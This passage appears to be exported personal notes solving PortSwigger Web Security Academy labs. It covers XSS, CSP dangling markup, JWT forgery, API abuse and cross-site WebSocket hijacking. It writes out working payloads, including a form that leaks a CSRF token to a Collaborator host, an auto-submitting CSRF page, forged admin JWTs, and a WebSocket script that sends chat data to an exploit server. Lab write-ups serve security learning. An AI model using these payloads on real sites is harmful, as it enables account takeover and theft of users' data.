+</p><figure id="1c62063d-f08b-802c-aeb5-e15c6ba31aa8" class="image"><a href="image%20224.png"><img style="width:654px" src="image%20224.png"/></a></figure></details></li></ul><ul id="1c62063d-f08b-802a-83df-c4f21b577e14" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked</a></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c72063d-f08b-80b5-a174-e5726142a9de" class="code"><code class="language-HTML">&lt;svg&gt;
+&lt;a&gt;
+&lt;animate attributeName=href values=javascript:alert(1)&gt;&lt;/animate&gt;
+&lt;text x=20 y=20 &gt; Click Me&lt;/text&gt;
+&lt;/a&gt;
+&lt;/svg&gt;</code></pre><p id="1c72063d-f08b-802d-877f-c7a20c9684b3" class="">
+</p><p id="1c72063d-f08b-8058-90bd-c6fbdada32f7" class="">
+</p><p id="1c02063d-f08b-805d-9dd2-cec1e8ed3a99" class="">
+</p></details></li></ul><ul id="1c72063d-f08b-80b1-bc29-c368e7a22486" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked</a></summary><p id="1c72063d-f08b-808e-aa96-cc8c4358664b" class="">payload used : <code>5&amp;&#x27;},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+&#x27;&#x27;,{&#x27;x&#x27;:&#x27;</code></p><p id="1c72063d-f08b-80b2-a408-c34c14d68af4" class="">syntax/format:  <a href="https://0a7b003104709d1580e6bc3700d50070.web-security-academy.net/post?postId=5&amp;%27">https://&lt;url-id&gt;.web-security-academy.net/post?postId=</a>payload </p><p id="1c72063d-f08b-8036-a523-dd8f4df58f48" class="">
+</p><p id="1c72063d-f08b-8057-86a4-c7eba7630eec" class=""><strong>use this final payload </strong><code><strong><a href="https://0a7b003104709d1580e6bc3700d50070.web-security-academy.net/post?postId=5&amp;%27">https://&lt;url-id&gt;.web-security-academy.net/post?postId=</a></strong></code><code><strong>5&amp;&#x27;},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+&#x27;&#x27;,{&#x27;x&#x27;:&#x27;</strong></code></p><p id="1c72063d-f08b-8077-84c6-f0ec8e9bb47f" class="">
+</p></details></li></ul><ul id="1c72063d-f08b-8064-9b16-df63f0f7b7bc" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack</a></summary><figure id="1c72063d-f08b-8034-b1fc-c10497a580d7" class="image"><a href="image%20225.png"><img style="width:654px" src="image%20225.png"/></a></figure><p id="1c72063d-f08b-8079-a876-e47495d587d2" class="">
+</p><p id="1c72063d-f08b-804b-bc96-e55df51df219" class="">payload used : <code>&quot;&gt;&lt;/form&gt;&lt;form class=&quot;login-form&quot; name=&quot;evil-form&quot; action=&quot;https://ebtohqccw3c5lyfulvk4u9sm9df432rr.oastify.com/token&quot; method=&quot;GET&quot;&gt;&lt;button class=&quot;button&quot; type=&quot;sumbit&quot;&gt;Click Me&lt;/button&gt;</code></p><hr id="1c72063d-f08b-8050-9f6a-d2f07a107ed3"/><p id="1c72063d-f08b-8082-ad0a-c9228e6de8a8" class="">in body box </p><p id="1c72063d-f08b-800c-8d37-de9f48daee32" class=""><code>&lt;script&gt;</code></p><p id="1c72063d-f08b-8019-ac5a-c03fc3cf6cea" class=""><code>location=’</code><code><a href="https://0ae000d804684221841b9a9c0061003f.web-security-academy.net/my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://ebtohqccw3c5lyfulvk4u9sm9df432rr.oastify.com/token%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22sumbit%22%3EClick%20Me%3C/button%3E">https://0ae000d804684221841b9a9c0061003f.web-security-academy.net/my-account?email=&quot;&gt;&lt;/form&gt;&lt;form class=&quot;login-form&quot; name=&quot;evil-form&quot; action=&quot;https://ebtohqccw3c5lyfulvk4u9sm9df432rr.oastify.com/token&quot; method=&quot;GET&quot;&gt;&lt;button class=&quot;button&quot; type=&quot;sumbit&quot;&gt;Click Me&lt;/button&gt;</a></code><code>’</code></p><p id="1c72063d-f08b-8015-aff4-d0012c35217e" class=""><code>&lt;/script&gt;</code></p><p id="1c72063d-f08b-8025-aff3-d7c11276d347" class="">then deliver the exploit and get the CSRF Token from burp collabrotorer  then </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c72063d-f08b-801b-bbc5-d892e484304d" class="code"><code class="language-HTML">&lt;html&gt;
+&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+&lt;body&gt;
+&lt;form action=&quot;https://0ae000d804684221841b9a9c0061003f.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker@evil-user.net&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;fWIW2FvDcvAzKSSWiLvJKQc7axSxCtmc&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);
+document.forms[0].submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><figure id="1c72063d-f08b-80f1-b4fb-ff8e3e40ae40" class="image"><a href="image%20226.png"><img style="width:654px" src="image%20226.png"/></a></figure></details></li></ul><ul id="1c72063d-f08b-8064-8211-c987cdd0066d" class="toggle"><li><details open=""><summary></summary></details></li></ul></details></li></ul><ul id="1c82063d-f08b-806a-b5eb-e111f793dfe8" class="toggle"><li><details open=""><summary><strong>JWT attacks</strong></summary><ul id="1c92063d-f08b-80ee-8f47-d5d85a231775" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature</a></summary><figure id="1c92063d-f08b-8045-b389-d70efa3cd36b" class="image"><a href="image%20227.png"><img style="width:653.9874877929688px" src="image%20227.png"/></a></figure><figure id="1c92063d-f08b-8036-92bd-ce61ec77a195" class="image"><a href="image%20228.png"><img style="width:653.9750366210938px" src="image%20228.png"/></a></figure><p id="1c92063d-f08b-8084-bda6-d0a846dff061" class="">then put this JWT in cookie’s values</p><figure id="1c92063d-f08b-8064-a84c-f1896b060bb4" class="image"><a href="image%20229.png"><img style="width:654px" src="image%20229.png"/></a></figure><p id="1c92063d-f08b-805b-bced-d1ede3c3a3df" class="">
+</p><p id="1c92063d-f08b-80f0-b688-c481026d7f79" class="">
+</p></details></li></ul><ul id="1c92063d-f08b-80d7-9a4f-e99becc1d7c9" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification</a></summary><figure id="1c92063d-f08b-80e3-8c6a-e9c18a8b1c76" class="image"><a href="image%20230.png"><img style="width:653.9750366210938px" src="image%20230.png"/></a></figure><p id="1c92063d-f08b-8075-a0c2-e3a5081340b6" class="">change the value </p><p id="1c92063d-f08b-80fb-b723-c53196b98afe" class="">:<code>eyJraWQiOiI3ZWQyODc2NS04MmExLTQzZTEtYjM2Mi04MmU3OTJjNzcxNWEiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzYxNjM5Miwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.</code></p><figure id="1c92063d-f08b-8075-91f9-e1c277e89feb" class="image"><a href="image%20231.png"><img style="width:654px" src="image%20231.png"/></a></figure></details></li></ul><ul id="1c92063d-f08b-8014-bf45-f59c4aa3e253" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key</a></summary><figure id="1ca2063d-f08b-80e0-b119-d03235a625e6" class="image"><a href="image%20232.png"><img style="width:653.9750366210938px" src="image%20232.png"/></a></figure><figure id="1ca2063d-f08b-8021-b812-efb28e419144" class="image"><a href="image%20233.png"><img style="width:653.9874877929688px" src="image%20233.png"/></a></figure><figure id="1ca2063d-f08b-80e6-b6b8-fa9c43670916" class="image"><a href="image%20234.png"><img style="width:653.9874877929688px" src="image%20234.png"/></a></figure><p id="1ca2063d-f08b-80ea-8a86-f608ccbddba9" class="">in last past this hash in to cookie’s values </p><figure id="1ca2063d-f08b-8028-b36e-ebccec71568f" class="image"><a href="image%20235.png"><img style="width:654px" src="image%20235.png"/></a></figure><p id="1ca2063d-f08b-80c7-8978-eb658da38b3d" class="">
+</p><p id="1ca2063d-f08b-8012-8924-cd5a8c8063cb" class="">
+</p><p id="1c92063d-f08b-8077-8202-d8a49690c579" class="">
+</p></details></li></ul><ul id="1cb2063d-f08b-801b-85df-c8121097ce46" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection</a></summary><figure id="1cb2063d-f08b-8075-adee-c328bd409fe3" class="image"><a href="Screenshot_2025-04-03_225938.png"><img style="width:654px" src="Screenshot_2025-04-03_225938.png"/></a></figure><figure id="1cb2063d-f08b-8068-9184-e7d608c8f18d" class="image"><a href="Screenshot_2025-04-03_225819.png"><img style="width:654px" src="Screenshot_2025-04-03_225819.png"/></a></figure><figure id="1cb2063d-f08b-80bc-8410-d71d7847a21e" class="image"><a href="Screenshot_2025-04-03_225909.png"><img style="width:654px" src="Screenshot_2025-04-03_225909.png"/></a></figure><p id="1cb2063d-f08b-80bc-b095-f8463485810b" class="">
+</p></details></li></ul><ul id="1cb2063d-f08b-80f4-ae35-f7dd20c41629" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection</a></summary><figure id="1cb2063d-f08b-80f2-a356-c53cc5e04d5c" class="image"><a href="image%20236.png"><img style="width:653.9750366210938px" src="image%20236.png"/></a></figure><figure id="1cb2063d-f08b-80b9-83a5-e7a4bfa5e65d" class="image"><a href="image%20237.png"><img style="width:653.9874877929688px" src="image%20237.png"/></a></figure><p id="1cb2063d-f08b-80ea-9a35-fc6b2d7ee68c" class=""><code>URL: </code><code><a href="https://exploit-0a8e0028046fb75580819330016900ee.exploit-server.net/exploit/jwks.json">https://exploit-0a8e0028046fb75580819330016900ee.exploit-server.net/exploit/jwks.json</a></code></p><figure id="1cb2063d-f08b-8024-b1d9-e1a4935f571b" class="image"><a href="image%20238.png"><img style="width:653.9874877929688px" src="image%20238.png"/></a></figure><figure id="1cb2063d-f08b-802e-917d-c131e35d0107" class="image"><a href="image%20239.png"><img style="width:654px" src="image%20239.png"/></a></figure><figure id="1cb2063d-f08b-802f-a4c2-e2eb3e5d2d89" class="image"><a href="image%20240.png"><img style="width:654px" src="image%20240.png"/></a></figure><p id="1cb2063d-f08b-80cb-add3-cbbf85eb8569" class="">
+</p><p id="1cb2063d-f08b-80f8-b3f6-eeba98c43b40" class="">
+</p></details></li></ul><ul id="1cb2063d-f08b-80c7-b8cf-d7d261ca0cb8" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal</a></summary><figure id="1cb2063d-f08b-80d1-8dd6-c10ece950a9f" class="image"><a href="image%20241.png"><img style="width:654px" src="image%20241.png"/></a></figure><figure id="1cb2063d-f08b-8036-a261-c15fe1873744" class="image"><a href="image%20242.png"><img style="width:654px" src="image%20242.png"/></a></figure><figure id="1cb2063d-f08b-803c-8898-c9c18aa04b52" class="image"><a href="image%20243.png"><img style="width:654px" src="image%20243.png"/></a></figure><figure id="1cb2063d-f08b-80ad-bf21-c4e154987ad0" class="image"><a href="image%20244.png"><img style="width:654px" src="image%20244.png"/></a></figure><p id="1cb2063d-f08b-801a-94a9-d862b9dd199f" class="">copy  the session cookie : <code>eyJraWQiOiIuLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzc0NTk2MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.FF6hQqKJJSCUUMToMaXr5VgA7kq13vDxVS_-vW3zc1A </code></p><p id="1cb2063d-f08b-8086-b3b6-ed79803a5a4e" class="">past it </p><figure id="1cb2063d-f08b-80f4-807e-e5e4a217fb50" class="image"><a href="image%20245.png"><img style="width:654px" src="image%20245.png"/></a></figure><p id="1cb2063d-f08b-8057-9dfc-c2873277dd87" class="">
+</p><p id="1cb2063d-f08b-80f2-a015-ce6a570267d4" class="">
+</p></details></li></ul><ul id="1cb2063d-f08b-8077-b83c-fc9d595e3845" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion">https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion</a></summary><figure id="1cb2063d-f08b-80db-834d-ee85a1394cfe" class="image"><a href="image%20246.png"><img style="width:654px" src="image%20246.png"/></a></figure><p id="1cb2063d-f08b-80df-8918-fec11196a8bc" class="">make new symmetric key </p><p id="1cb2063d-f08b-8010-9bd3-d08b09aa2f1d" class="">copy this key and past it here </p><figure id="1cb2063d-f08b-8021-bca7-eb6f7b7c9752" class="image"><a href="image%20247.png"><img style="width:654px" src="image%20247.png"/></a></figure><p id="1cb2063d-f08b-8092-8abd-c7c64b9ce5d6" class="">click PEM and copy they public key and click ok!</p><figure id="1cb2063d-f08b-80ac-908a-d325ca8f7acd" class="image"><a href="image%20248.png"><img style="width:654px" src="image%20248.png"/></a></figure><p id="1cb2063d-f08b-80a6-b10f-df6b827f433c" class="">past this public key and encode it into base64 then copy it </p><p id="1cb2063d-f08b-8091-9890-db9fecd3cdfb" class="">make a new RSA key</p><p id="1cb2063d-f08b-80bd-873a-da6bae1001b9" class="">past it in k’s value k=key then click ok </p><figure id="1cb2063d-f08b-80f3-8b37-e0055eab86bf" class="image"><a href="image%20249.png"><img style="width:654px" src="image%20249.png"/></a></figure><p id="1cb2063d-f08b-8099-b156-d155de39a610" class="">change alg and sub  then click sign and ok</p><figure id="1cb2063d-f08b-80d5-bd2a-eca021200d9e" class="image"><a href="image%20250.png"><img style="width:654px" src="image%20250.png"/></a></figure><p id="1cb2063d-f08b-80aa-84b7-c9d373f402e5" class="">copy the cookie  and past it in value </p><figure id="1cb2063d-f08b-805c-af92-f35f9889bb9e" class="image"><a href="image%20251.png"><img style="width:1920px" src="image%20251.png"/></a></figure></details></li></ul><ul id="1cb2063d-f08b-8027-92a0-c219f71fe8f8" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key">https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key</a></summary><p id="1cb2063d-f08b-80c0-b836-ff92561b6747" class="">
+</p></details></li></ul></details></li></ul><ul id="1cc2063d-f08b-8040-bc0c-cb5a1023368c" class="toggle"><li><details open=""><summary>API Testing</summary><ul id="1cc2063d-f08b-8021-9955-d4a61afdccf8" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation">https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation</a></summary><figure id="1cc2063d-f08b-80d8-b47f-eab9e2b51f09" class="image"><a href="image%20252.png"><img style="width:654px" src="image%20252.png"/></a></figure><figure id="1cc2063d-f08b-8075-855d-c015e1123090" class="image"><a href="image%20253.png"><img style="width:654px" src="image%20253.png"/></a></figure></details></li></ul><ul id="1cc2063d-f08b-800f-83e0-c648c4c57ee9" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string">https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string</a></summary><figure id="1cc2063d-f08b-8067-a996-f8d30ba01531" class="image"><a href="image%20254.png"><img style="width:654px" src="image%20254.png"/></a></figure><figure id="1cc2063d-f08b-80d5-b333-c9a782658af1" class="image"><a href="image%20255.png"><img style="width:654px" src="image%20255.png"/></a></figure><figure id="1cc2063d-f08b-80f3-8244-daff9b715b2e" class="image"><a href="image%20256.png"><img style="width:654px" src="image%20256.png"/></a></figure><p id="1cc2063d-f08b-80c7-8223-cda65542e4a7" class="">
+</p><figure id="1cc2063d-f08b-80ec-bf95-f7f687453bc0" class="image"><a href="image%20257.png"><img style="width:654px" src="image%20257.png"/></a></figure><figure id="1cc2063d-f08b-80ab-befe-d10ff4e7d883" class="image"><a href="image%20258.png"><img style="width:654px" src="image%20258.png"/></a></figure><p id="1cc2063d-f08b-8015-91e1-d1b4c266ed90" class="">after this create a password and login again </p><p id="1cc2063d-f08b-809e-87d4-c3cbba57910c" class="">
+</p></details></li></ul><ul id="1cc2063d-f08b-801a-83bc-cf02eacbff2f" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint">https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint</a>\</summary><figure id="1cc2063d-f08b-8041-8354-c16985d61561" class="image"><a href="image%20259.png"><img style="width:654px" src="image%20259.png"/></a></figure><figure id="1cc2063d-f08b-8070-9a6a-c849d8e9725b" class="image"><a href="image%20260.png"><img style="width:654px" src="image%20260.png"/></a></figure><p id="1cc2063d-f08b-80db-aaa2-cb93d8ebabc8" class="">copy session cookie and replace it </p><p id="1cc2063d-f08b-80be-bc2a-ce2343e4bdb1" class="">in this request PATCH</p><figure id="1cc2063d-f08b-80c0-a627-f88e494c029e" class="image"><a href="image%20261.png"><img style="width:654px" src="image%20261.png"/></a></figure><p id="1cc2063d-f08b-802d-9ec0-f0659df84700" class="">after this place order again and price of product become $0 </p><figure id="1cc2063d-f08b-80eb-b410-c0667202f947" class="image"><a href="image%20262.png"><img style="width:654px" src="image%20262.png"/></a></figure></details></li></ul><ul id="1cc2063d-f08b-8069-ae79-e05815eabf7c" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability">https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability</a></summary><figure id="1cc2063d-f08b-804e-b267-f8e3fd29ef10" class="image"><a href="image%20263.png"><img style="width:654px" src="image%20263.png"/></a></figure><figure id="1cc2063d-f08b-80eb-bab6-f8c5a1ad3efa" class="image"><a href="image%20264.png"><img style="width:654px" src="image%20264.png"/></a></figure><p id="1cc2063d-f08b-803d-a1ea-f33c3d01b380" class="">i have just add the another object in this request </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1cc2063d-f08b-80f3-a989-c1e6aac30c33" class="code"><code class="language-HTML">,
+&quot;chosen_discount&quot;:{
+&quot;percentage&quot;:100
+}</code></pre></details></li></ul><ul id="1cc2063d-f08b-80cc-ab69-c83ba6220d19" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url">https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url</a></summary><figure id="1cc2063d-f08b-8014-8f31-efd2e677ce2f" class="image"><a href="image%20265.png"><img style="width:654px" src="image%20265.png"/></a></figure><p id="1cc2063d-f08b-8004-bd8c-d32991de307d" class="">copy the right side result  :<code>g19jvq4homm2mdhk9n7htb17f4n0vosp</code></p><p id="1cc2063d-f08b-803c-a422-e478868e33b3" class="">find the : <code>GET /forgot-password?passwordResetToken=g19jvq4homm2mdhk9n7htb17f4n0vosp HTTP/2</code></p><figure id="1cc2063d-f08b-801f-aeaf-c69c4d848fc5" class="image"><a href="image%20266.png"><img style="width:653.9874877929688px" src="image%20266.png"/></a></figure><p id="1cc2063d-f08b-8077-affc-c39c2e8211c1" class="">copy  the responcse link and open it in browser </p><p id="1cc2063d-f08b-8010-8a00-ce7cb32c15c2" class="">
+</p><figure id="1cc2063d-f08b-8086-b335-e9908c410fc0" class="image"><a href="image%20267.png"><img style="width:654px" src="image%20267.png"/></a></figure><p id="1cc2063d-f08b-8002-aa18-e27c84303497" class=""> </p><figure id="1cc2063d-f08b-800c-9643-e3304e55373e" class="image"><a href="image%20268.png"><img style="width:654px" src="image%20268.png"/></a></figure><p id="1cb2063d-f08b-80f9-9e0d-f1405899e729" class="">change the password and relogin again </p></details></li></ul></details></li></ul><ul id="1cc2063d-f08b-803d-8823-ffbf71f399f7" class="toggle"><li><details open=""><summary><strong>WebSockets</strong></summary><ul id="1cc2063d-f08b-80ac-8fcb-cea575db817c" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities">https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities</a></summary><figure id="1cd2063d-f08b-80cd-9dd4-d6ed09782b6b" class="image"><a href="image%20269.png"><img style="width:654px" src="image%20269.png"/></a></figure><p id="1cd2063d-f08b-80c1-8302-c9493f172b55" class="">replace from this   <code>&quot;\t&lt;img src=0 onerror=\&quot;alert(1)\&quot;&gt;”</code>  to  <code>&quot;&lt;img src=1 onerror=\&quot;alert(1)\&quot;&gt;&quot;</code></p><p id="1cd2063d-f08b-805f-8173-c98b6c99d0b0" class="">&quot;message&quot;:&quot;&lt;img src=1 onerror=\&quot;alert(1)\&quot;&gt;&quot;</p><figure id="1cd2063d-f08b-800e-a171-d83bafb825e7" class="image"><a href="image%20270.png"><img style="width:654px" src="image%20270.png"/></a></figure><p id="1cd2063d-f08b-80be-90f2-f22bf035eccb" class="">
+</p><p id="1cd2063d-f08b-807a-a7a9-c86e031805fa" class="">
+</p><p id="1cd2063d-f08b-8092-aba2-e99c398477d8" class="">
+</p><p id="1cd2063d-f08b-8018-8c8e-d4256cd879b5" class="">
+</p></details></li></ul><ul id="1cd2063d-f08b-804e-b795-e2e25817c432" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab">https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab</a></summary><p id="1cd2063d-f08b-80eb-b4ae-d5d465a8219c" class="">payload used in exploit server : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1cd2063d-f08b-803e-9b53-d8a5b3044155" class="code"><code class="language-HTML">var ws = new WebSocket(
+&quot;wss://0a2900b10322991a82d0c0d300f10031.web-security-academy.net/chat&quot;
+);
+
+ws.onopen = function () {
+ws.send(&quot;READY&quot;);
+};
+
+ws.onmessage = function (event) {
+fetch(
+&quot; https://exploit-0a0800360353999d827fbf5201bc00ee.exploit-server.net/exploit?message=&quot; +
+btoa (event.data)
+);
+};</code></pre><p id="1cd2063d-f08b-8086-9027-e00e8c310d8e" class="">
+</p><figure id="1cd2063d-f08b-804f-8c91-d5f7cc0756c7" class="image"><a href="image%20271.png"><img style="width:654px" src="image%20271.png"/></a></figure><p id="1cd2063d-f08b-80a4-a52e-e2221d6bf4ee" class="">filter below hashes from logs </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1cd2063d-f08b-80f0-af00-e282ee42ea04" class="code"><code class="language-HTML">eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0=
+eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgbDdseHh0azJzaHRhY2s4MjgzOGsifQ==
+eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9
+eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9
+</code></pre><p id="1cd2063d-f08b-801c-9872-f41d24001e30" class="">then decode into base64 </p><figure id="1cd2063d-f08b-8013-9f9e-f0cde9edaade" class="image"><a href="image%20272.png"><img style="width:654px" src="image%20272.png"/></a></figure><p id="1cd2063d-f08b-80cb-b32d-fe3600a9d812" class="">
+</p><p id="1cd2063d-f08b-80f9-948b-cc4e61c3a6c5" class="">
+</p></details></li></ul><ul id="1cd2063d-f08b-8057-aca7-c6bafdcef392" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities">https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities</a></summary><p id="1cd2063d-f08b-80eb-b555-cb743e231e52" class="">
+</p></details></li></ul></details></li></ul><ul id="1cc2063d-f08b-8073-aee7-db4d489ca008" class="toggle"><li><details open=""><summary><strong>Race Conditions</strong></summary><p id="1cd2063d-f08b-8041-a452-ec8c8542fca5" class="">
+</p></details></li></ul><h1 id="1cf2063d-f08b-8094-be5a-c161d4dc1268" class=""></h1><p id="1cc2063d-f08b-8094-b09a-d6a8d917bd28" class="">
+</p><p id="1cc2063d-f08b-8076-aca8-ef76a3f5fff4" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
